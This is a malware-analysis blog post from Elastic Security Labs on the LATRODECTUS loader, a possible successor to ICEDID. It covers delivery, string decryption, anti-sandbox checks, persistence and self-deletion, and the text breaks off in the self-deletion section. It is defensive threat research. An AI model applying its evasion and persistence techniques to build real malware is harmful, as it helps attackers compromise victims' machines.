<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>Spring Cleaning with LATRODECTUS: A Potential Replacement for ICEDID — Elastic Security Labs</title><meta name="description" content="Elastic Security Labs has observed an uptick in a recent emerging loader known as LATRODECTUS. This lightweight loader packs a big punch with ties to ICEDID and may turn into a possible replacement to fill the gap in the loader market."/><meta property="og:title" content="Spring Cleaning with LATRODECTUS: A Potential Replacement for ICEDID — Elastic Security Labs"/><meta property="og:description" content="Elastic Security Labs has observed an uptick in a recent emerging loader known as LATRODECTUS. This lightweight loader packs a big punch with ties to ICEDID and may turn into a possible replacement to fill the gap in the loader market."/><meta property="og:image" content="https://www.elastic.co/security-labs/assets/images/spring-cleaning-with-latrodectus/Security Labs Images 16.jpg?fa999df5c15b56c9813aded51882549e"/><meta property="og:image:alt" content="Elastic Security Labs has observed an uptick in a recent emerging loader known as LATRODECTUS. This lightweight loader packs a big punch with ties to ICEDID and may turn into a possible replacement to fill the gap in the loader market."/><meta property="og:site_name"/><meta property="og:url" content="https://www.elastic.co/security-labs/spring-cleaning-with-latrodectus"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Spring Cleaning with LATRODECTUS: A Potential Replacement for ICEDID — Elastic Security Labs"/><meta name="twitter:description" content="Elastic Security Labs has observed an uptick in a recent emerging loader known as LATRODECTUS. This lightweight loader packs a big punch with ties to ICEDID and may turn into a possible replacement to fill the gap in the loader market."/><meta name="twitter:image" content="https://www.elastic.co/security-labs/assets/images/spring-cleaning-with-latrodectus/Security Labs Images 16.jpg?fa999df5c15b56c9813aded51882549e"/><meta name="twitter:image:alt" content="Elastic Security Labs has observed an uptick in a recent emerging loader known as LATRODECTUS. This lightweight loader packs a big punch with ties to ICEDID and may turn into a possible replacement to fill the gap in the loader market."/><link rel="canonical" href="https://www.elastic.co/security-labs/spring-cleaning-with-latrodectus"/><link rel="preload" href="/security-labs/logo.svg" as="image" fetchpriority="high"/><link rel="preload" as="image" imageSrcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fspring-cleaning-with-latrodectus%2FSecurity%20Labs%20Images%2016.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fspring-cleaning-with-latrodectus%2FSecurity%20Labs%20Images%2016.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fspring-cleaning-with-latrodectus%2FSecurity%20Labs%20Images%2016.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fspring-cleaning-with-latrodectus%2FSecurity%20Labs%20Images%2016.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fspring-cleaning-with-latrodectus%2FSecurity%20Labs%20Images%2016.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fspring-cleaning-with-latrodectus%2FSecurity%20Labs%20Images%2016.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fspring-cleaning-with-latrodectus%2FSecurity%20Labs%20Images%2016.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fspring-cleaning-with-latrodectus%2FSecurity%20Labs%20Images%2016.jpg&amp;w=3840&amp;q=75 3840w" imageSizes="100vw" fetchpriority="high"/><meta name="next-head-count" content="19"/><script src="https://play.vidyard.com/embed/v4.js" type="text/javascript" async=""></script><link rel="icon" href="/security-labs/favicon.svg"/><link rel="mask-icon" href="/security-labs/favicon.svg" color="#1C1E23"/><link rel="apple-touch-icon" href="/security-labs/favicon.svg"/><meta name="theme-color" content="#1C1E23"/><link rel="preload" href="/security-labs/_next/static/media/6d93bde91c0c2823-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/a34f9d1faa5f3315-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/369c6e283c5acc6e-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/92f44bb82993d879-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/ee71530a747ff30b-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/9fac010bc1f02be0-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/cbf5fbad4d73afac-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><script id="google-tag-manager" data-nscript="beforeInteractive">
          (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
          'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
          })(window,document,'script','dataLayer','GTM-KNJMG2M');
          </script><link rel="preload" href="/security-labs/_next/static/css/265ed7605fd03477.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/265ed7605fd03477.css" data-n-g=""/><link rel="preload" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/security-labs/_next/static/chunks/polyfills-78c92fac7aa8fdd8.js"></script><script src="/security-labs/_next/static/chunks/webpack-7987c6fda769d510.js" defer=""></script><script src="/security-labs/_next/static/chunks/framework-7a7e500878b44665.js" defer=""></script><script src="/security-labs/_next/static/chunks/main-ebd33a9f1cae5951.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/_app-cb8664d1d3df2511.js" defer=""></script><script src="/security-labs/_next/static/chunks/fec483df-43ee602fabdfe3a4.js" defer=""></script><script src="/security-labs/_next/static/chunks/877-34f408271ef44c22.js" defer=""></script><script src="/security-labs/_next/static/chunks/511-d08fe0fdd6f8a984.js" defer=""></script><script src="/security-labs/_next/static/chunks/683-a5053c37fe5bd0c9.js" defer=""></script><script src="/security-labs/_next/static/chunks/402-791da5e634930df4.js" defer=""></script><script src="/security-labs/_next/static/chunks/616-0b017b9cfa597392.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/%5Bslug%5D-3d74e9a05863bcfd.js" defer=""></script><script src="/security-labs/_next/static/dGrrQfBbQkqaleQ_11aBK/_buildManifest.js" defer=""></script><script src="/security-labs/_next/static/dGrrQfBbQkqaleQ_11aBK/_ssgManifest.js" defer=""></script></head><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KNJMG2M" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><div id="__next"><main class="__variable_0351a5 __variable_1f211e __variable_a5b5f5 flex flex-col min-h-screen"><div class="scroll-percentage-container"><div class="scroll-percentage-bar" style="width:0%"></div></div><nav class="fixed w-full z-40" data-headlessui-state=""><div class="bg-gradient-to-b from-zinc-900 from-20% h-[200%] to-transparent absolute inset-0 z-0 pointer-events-none"></div><div class="container relative z-10"><div class="flex h-16 items-center justify-between"><div class="flex items-center justify-start w-full"><div><a class="hover:opacity-50 transition" href="/security-labs"><img alt="elastic security labs logo" fetchpriority="high" width="200" height="30" decoding="async" data-nimg="1" style="color:transparent" src="/security-labs/logo.svg"/></a></div><div class="hidden lg:ml-6 lg:block"><div class="flex space-x-4"><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/about"><span>About</span></a><div class="relative" data-headlessui-state=""><div><button class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" id="headlessui-menu-button-:R2kpm:" type="button" aria-haspopup="menu" aria-expanded="false" data-headlessui-state="">Topics<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="ml-1 -mr-1 h-4 w-4 text-zinc-400 relative top-[1px]"><path fill-rule="evenodd" d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z" clip-rule="evenodd"></path></svg></button></div></div><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/vulnerability-updates"><span>Vulnerability updates</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/reports"><span>Reports</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/tools"><span>Tools</span></a></div></div><div class="hidden lg:ml-auto lg:block"><div class="flex items-center space-x-4"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/spring-cleaning-with-latrodectus"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="https://www.elastic.co/security-labs/rss/feed.xml"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="h-4 w-4 mr-1"><path d="M3.75 3a.75.75 0 00-.75.75v.5c0 .414.336.75.75.75H4c6.075 0 11 4.925 11 11v.25c0 .414.336.75.75.75h.5a.75.75 0 00.75-.75V16C17 8.82 11.18 3 4 3h-.25z"></path><path d="M3 8.75A.75.75 0 013.75 8H4a8 8 0 018 8v.25a.75.75 0 01-.75.75h-.5a.75.75 0 01-.75-.75V16a6 6 0 00-6-6h-.25A.75.75 0 013 9.25v-.5zM7 15a2 2 0 11-4 0 2 2 0 014 0z"></path></svg><span class="hidden xl:block">Subscribe</span></a><a class="font-display inline-flex items-center justify-center rounded font-semibold disabled:!select-none disabled:!bg-gray-400 bg-blue-600 text-white hover:bg-blue-500 enabled:hover:text-white/80 transition-colors px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://cloud.elastic.co/registration?cta=cloud-registration&amp;tech=trial&amp;plcmt=navigation&amp;pg=security-labs">Start free trial</a><a class="font-display inline-flex items-center justify-center rounded font-semibold text-white disabled:!select-none disabled:!bg-gray-400 button px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://www.elastic.co/contact">Contact sales</a></div></div></div><div class="-mr-2 flex lg:hidden"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/spring-cleaning-with-latrodectus"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><button class="inline-flex items-center justify-center rounded-md p-2 text-gray-400 hover:bg-gray-700 hover:text-white focus:outline-none focus:ring-2 focus:ring-inset focus:ring-white" id="headlessui-disclosure-button-:R59m:" type="button" aria-expanded="false" data-headlessui-state=""><span class="sr-only">Open navigation menu</span><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="block h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"></path></svg></button></div></div></div></nav><main class="mb-20 flex-1 flex flex-col"><div class="h-48 md:h-64"><div class="after:absolute after:block after:bg-blue-400 after:blur-3xl after:content-[&#x27; &#x27;] after:h-96 after:opacity-5 after:right-0 after:rounded-full after:top-20 after:w-1/2 after:z-0 before:absolute before:block before:blur-3xl before:bg-orange-400 before:content-[&#x27; &#x27;] before:h-96 before:left-0 before:opacity-5 before:rounded-full before:w-1/2 before:z-0 w-full h-full relative"><div class="relative z-10 w-full h-[125%] -top-[25%] bg-no-repeat bg-cover bg-bottom flex items-center justify-center" style="background-image:url(/security-labs/grid.svg)"></div></div></div><article class="px-4"><div class="max-w-7xl mx-auto relative z-10 flex flex-col space-y-4"><div class="eyebrow break-words"><time class="block mb-2 md:mb-0 md:inline-block article-published-date" dateTime="2024-05-16T00:00:00.000Z">16 May 2024</time><span class="hidden md:inline-block md:mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/daniel-stepanic">Daniel Stepanic</a><span class="mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/samir-bousseaden">Samir Bousseaden</a></div><h1 class="font-bold leading-tighter text-3xl md:text-5xl"><span>Spring Cleaning with LATRODECTUS: A Potential Replacement for&nbsp;ICEDID</span></h1><p class="text-zinc-200 text-base md:text-xl">The LATRODECTUS loader evolves to deliver ICEDID and other malware</p><div class="flex items-center mt-4 text-zinc-200 text-sm space-x-4 border-t border-white/25 pt-4"><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M12 6v6h4.5m4.5 0a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg><span>24 min read</span></span><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M9.568 3H5.25A2.25 2.25 0 003 5.25v4.318c0 .597.237 1.17.659 1.591l9.581 9.581c.699.699 1.78.872 2.607.33a18.095 18.095 0 005.223-5.223c.542-.827.369-1.908-.33-2.607L11.16 3.66A2.25 2.25 0 009.568 3z"></path><path stroke-linecap="round" stroke-linejoin="round" d="M6 6h.008v.008H6V6z"></path></svg><span><a class="hover:text-blue-400 whitespace-nowrap" href="/security-labs/category/malware-analysis">Malware analysis</a></span></span></div></div><div class="max-w-7xl mx-auto"><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 sm:p-8 md:p-10 rounded-3xl mt-5 md:mt-10"><div class="relative w-full rounded-lg overflow-hidden aspect-video"><img alt="Spring Cleaning with LATRODECTUS: A Potential Replacement for ICEDID" fetchpriority="high" decoding="async" data-nimg="fill" class="object-cover absolute h-full w-full" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="100vw" srcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fspring-cleaning-with-latrodectus%2FSecurity%20Labs%20Images%2016.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fspring-cleaning-with-latrodectus%2FSecurity%20Labs%20Images%2016.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fspring-cleaning-with-latrodectus%2FSecurity%20Labs%20Images%2016.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fspring-cleaning-with-latrodectus%2FSecurity%20Labs%20Images%2016.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fspring-cleaning-with-latrodectus%2FSecurity%20Labs%20Images%2016.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fspring-cleaning-with-latrodectus%2FSecurity%20Labs%20Images%2016.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fspring-cleaning-with-latrodectus%2FSecurity%20Labs%20Images%2016.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fspring-cleaning-with-latrodectus%2FSecurity%20Labs%20Images%2016.jpg&amp;w=3840&amp;q=75 3840w" src="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fspring-cleaning-with-latrodectus%2FSecurity%20Labs%20Images%2016.jpg&amp;w=3840&amp;q=75"/><div class="absolute border border-white/50 inset-0 mix-blend-overlay rounded-lg z-10"></div></div></div></div><div class="lg:max-w-7xl mx-auto relative mt-12 lg:grid lg:grid-cols-4 lg:gap-8 items-start"><div class="flex justify-center lg:col-span-3"><div class="prose lg:prose-lg prose-invert w-full article-content"><div><h2 class="font-bold text-2xl md:text-4xl relative"><span id="latrodectus-at-a-glance" class="absolute -top-32"></span>LATRODECTUS at a glance</h2>
<p>First <a href="https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39">discovered</a> by Walmart researchers in October of 2023, <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.unidentified_111">LATRODECTUS</a> is a malware loader gaining popularity among cybercriminals. While this is considered a new family, there is a strong link between LATRODECTUS and <a href="https://www.elastic.co/security-labs/thawing-the-permafrost-of-icedid-summary">ICEDID</a> due to behavioral and developmental similarities, including a command handler that downloads and executes encrypted payloads like ICEDID. Proofpoint and Team Cymru built upon this connection to discover a <a href="https://www.proofpoint.com/us/blog/threat-insight/latrodectus-spider-bytes-ice">strong link</a> between the network infrastructure used by both the operators of ICEDID and LATRODECTUS.</p>
<p>LATRODECTUS offers a comprehensive range of standard capabilities that threat actors can utilize to deploy further payloads, conducting various activities after initial compromise. The code base isn’t obfuscated and contains only 11 command handlers focused on enumeration and execution. This type of loader represents a recent wave observed by our team such as <a href="https://www.elastic.co/security-labs/pikabot-i-choose-you">PIKABOT</a>, where the code is more lightweight and direct with a limited number of handlers.</p>
<p>This article will focus on LATRODECTUS itself, analyzing its most significant features and sharing resources for addressing this financially impactful threat.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="key-takeaways" class="absolute -top-32"></span>Key takeaways</h3>
<ul>
<li>Initially discovered by Walmart researchers last year, LATRODECTUS continues to gain adoption among recent financially-motivated campaigns</li>
<li>LATRODECTUS, a possible replacement for ICEDID shares similarity to ICEDID including a command handler to execute ICEDID payloads</li>
<li>We observed new event handlers (process discovery, desktop file listing) since its inception and integration of a self-delete technique to delete running files</li>
<li>Elastic Security provides a high degree of capability through memory signatures, behavioral rules, and hunting opportunities to respond to threats like LATRODECTUS</li>
</ul>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="latrodectus-campaign-overview" class="absolute -top-32"></span>LATRODECTUS campaign overview</h3>
<p>Beginning early March of 2024, Elastic Security Labs observed an increase in email campaigns delivering LATRODECTUS. These campaigns typically involve a recognizable infection chain involving oversized JavaScript files that utilize WMI’s ability to invoke msiexec.exe and install a remotely-hosted MSI file, remotely hosted on a WEBDAV share.</p>
<p></p>
<p>With major changes in the loader space during the past year, such as the <a href="https://www.elastic.co/security-labs/qbot-malware-analysis">QBOT</a> takedown and <a href="https://www.elastic.co/security-labs/unpacking-icedid">ICEDID</a> dropping off, we are seeing new loaders such as <a href="https://www.elastic.co/security-labs/pikabot-i-choose-you">PIKABOT</a> and <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.unidentified_111">LATRODECTUS</a> have emerged as possible replacements.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="latrodectus-analysis" class="absolute -top-32"></span>LATRODECTUS analysis</h2>
<p>Our LATRODECTUS <a href="https://www.virustotal.com/gui/file/aee22a35cbdac3f16c3ed742c0b1bfe9739a13469cf43b36fb2c63565111028c/details">sample</a> comes initially packed with file information <a href="https://attack.mitre.org/techniques/T1036/">masquerading</a> as a component to Bitdefender’s kernel-mode driver (TRUFOS.SYS), shown in the following image.</p>
<p></p>
<p>In order to move forward with malware analysis, the sample must be unpacked manually or via an automatic unpacking service such as <a href="http://Unpac.Me">UnpacMe</a>.</p>
<p></p>
<p>LATRODECTUS is a DLL with 4 different exports, and each export is assigned the same export address.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="string-obfuscation" class="absolute -top-32"></span>String obfuscation</h3>
<p>All of the strings within LATRODECTUS are protected using a straightforward algorithm on the encrypted bytes and applying a transformation by performing arithmetic and bitwise operations. The initial <a href="https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39">report</a> published in 2023 detailed a PRNG algorithm that was not observed in our sample, suggesting continuous development of this loader. Below is the algorithm implemented in Python using our <a href="https://github.com/elastic/labs-releases/tree/main/nightMARE">nightMARE framework</a>:</p>
<pre><code>def decrypt_string(encrypted_bytes: bytes) -&gt; bytes:
    x = cast.u32(encrypted_bytes[:4])
    y = cast.u16(encrypted_bytes[4:6])
    byte_size = cast.u16(cast.p32(x ^ y)[:2])
    decoded_bytes = bytearray(byte_size)

    for i, b in enumerate(encrypted_bytes[6 : 6 + byte_size]):
        decoded_bytes[i] = ((x + i + 1) ^ b) % 256

    return bytes(decoded_bytes)</code></pre>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="runtime-api" class="absolute -top-32"></span>Runtime API</h3>
<p>LATRODECTUS obfuscates the majority of its imports until runtime. At the start of the program, it queries the PEB in combination with using a CRC32 checksum to resolve <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">kernel32.dll</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ntdll.dll</code> modules and their functions. In order to resolve additional libraries such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">user32.dll</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">wininet.dll</code>, the malware takes a different approach performing a wildcard search (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">*.dll</code>) in the Windows system directory. It retrieves each DLL filename and passes them directly to a CRC32 checksum function.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="anti-analysis" class="absolute -top-32"></span>Anti-analysis</h3>
<p>When all the imports are resolved, LATRODECTUS performs several serial anti-analysis checks. The first monitors for a debugger by looking for the BeingDebugged flag inside the Process Environment Block (PEB). If a debugger is identified, the program terminates.</p>
<p></p>
<p>In order to avoid sandboxes or virtual machines that may have a low number of active processes, two validation checks are used to combine the number of running processes with the OS product version.</p>
<p></p>
<p>In order to account for the major differences between Windows OS versions, the developer uses a custom enum based on the major/minor version, and build numbers within Windows.</p>
<p></p>
<p>The two previous conditions translate to:</p>
<ul>
<li>LATRODECTUS will exit if the number of processes is less than 75 and the OS version is a recent build such as Windows 10, Windows Server 2016, or Windows 11</li>
<li>LATRODECTUS will exit if the number of processes is less than 50 and the OS version is an older build such as Windows Server 2003 R2, Windows XP, Windows 2000, Windows 7, Windows 8, or Windows Server 2012/R2</li>
</ul>
<p>After the sandbox check, LATRODECTUS verifies if the current process is running under WOW64, a subsystem of Windows operating systems that allows for 32-bit applications to run on 64-bit systems. If true (running as a 32-bit application on a 64-bit OS), the malware will exit.</p>
<p></p>
<p>The last check is based on verifying the MAC address via the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">GetAdaptersInfo()</code> call from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">iphlpapi.dll</code>. If there is no valid MAC Address, the malware will also terminate.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="mutex" class="absolute -top-32"></span>Mutex</h3>
<p>This malware uses the string <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">runnung</code> as the mutex to prevent re-infection on the host, which may be an accidental typo on the part of developers.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hardware-id" class="absolute -top-32"></span>Hardware ID</h3>
<p>After the mutex creation, LATRODECTUS will generate a hardware ID that is seeded from the volume serial number of the machine in combination with multiplying a hard-coded constant (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0x19660D</code>).</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="campaign-id" class="absolute -top-32"></span>Campaign ID</h3>
<p>At this stage, the decrypted campaign name (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Littlehw</code>) from our sample is used as a seed passed into a Fowler–Noll–Vo hashing <a href="https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function">function</a>. This will produce a hash that is used by the actor to track different campaigns and associated victim machines.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="setup--persistence" class="absolute -top-32"></span>Setup / persistence</h3>
<p>The malware will generate a folder path using a configuration parameter, these determine the location where LATRODECTUS will be dropped on disk, such as the following directories:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">AppData</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Desktop</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Startup</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Personal</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Local\AppData</code></li>
</ul>
<p>Our sample was configured with the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">AppData</code> location using a hard-coded directory string <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Custom_update</code> along with a hardcoded filename <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Update_</code> concatenated with digits seeded from the volume serial number. Below is the full file path inside our VM:</p>
<pre><code>C:\Users\REM\AppData\Roaming\Custom_update\Update_88d58563.dll</code></pre>
<p>The malware will check for an existing file <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">AppData\Roaming\Custom_update\update_data.dat</code> to read from, and if the file does not exist it will create the directory before writing a copy of itself in the directory.</p>
<p></p>
<p>After the file is copied, LATRODECTUS retrieves two C2 domains from the global configuration, using the previously-described string decryption function.</p>
<p></p>
<p>Before the main thread is executed for command dispatching, LATRODECTUS sets up a scheduled task for persistence using the Windows Component Object Model (COM).</p>
<p></p>
<p>In our sample, the task name is hardcoded as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Updater</code> and scheduled to execute upon successful logon.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="self-deletion" class="absolute -top-32"></span>Self-deletion</h3>
<p>Self-deletion is one noteworthy technique incorporated by LATRODECTUS. It was <a href="https://x.com/jonasLyk/status/1350401461985955840">discovered</a> by Jonas Lykkegaard and implemented by Lloyd Davies in the delete-self-poc <a href="https://github.com/LloydLabs/delete-self-poc">repo</a>. The technique allows LATRODECTUS to delete itself while the process is still running using an alternate data stream.</p>
